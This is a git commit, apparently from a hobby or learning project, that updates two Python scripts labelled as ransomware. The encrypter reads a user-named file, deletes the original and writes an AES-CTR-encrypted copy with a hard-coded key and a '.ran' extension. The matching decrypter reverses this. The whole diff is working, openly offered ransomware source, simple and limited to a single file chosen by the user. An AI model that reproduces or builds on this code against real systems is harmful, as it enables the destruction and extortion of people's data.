c49f0667f75b3863328884b670ebbf7579c0cbdc
HiroshiFK <felipekatsuno@hotmail.com>
2023-12-30 12:26:25 -0300

    updated ransonware

--- decrypter.py
+++ decrypter.py
@@ -1,14 +1,15 @@
 import os
 import pyaes
+import time
 
 ## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
+file_name = input('Digite o nome do arquivo criptografado (padrão: arquivo.txt.ran): ')
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
 ## chave para descriptografia
-key = b"testeransomwares"
+key = b"ransonwareattack"
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
@@ -16,7 +17,11 @@ decrypt_data = aes.decrypt(file_data)
 os.remove(file_name)
 
 ## criar o arquivo descriptografado
-new_file = "teste.txt"
+new_file = file_name[:-3]
 new_file = open(f'{new_file}', "wb")
 new_file.write(decrypt_data)
 new_file.close()
+
+## mostrar mensagem
+print('Descriptografado com êxito')
+time.sleep(5)
--- encrypter.py
+++ encrypter.py
@@ -1,8 +1,9 @@
 import os
 import pyaes
+import time
 
 ## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+file_name = input('Digite o nome do arquivo com extensão (padrão: arquivo.txt): ')
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
@@ -11,14 +12,18 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"ransonwareattack"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_name + ".ran"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
+
+## mostrar mensagem
+print('Criptografado com êxito, nome do arquivo: ' + str(file_name + ".ran"))
+time.sleep(5)
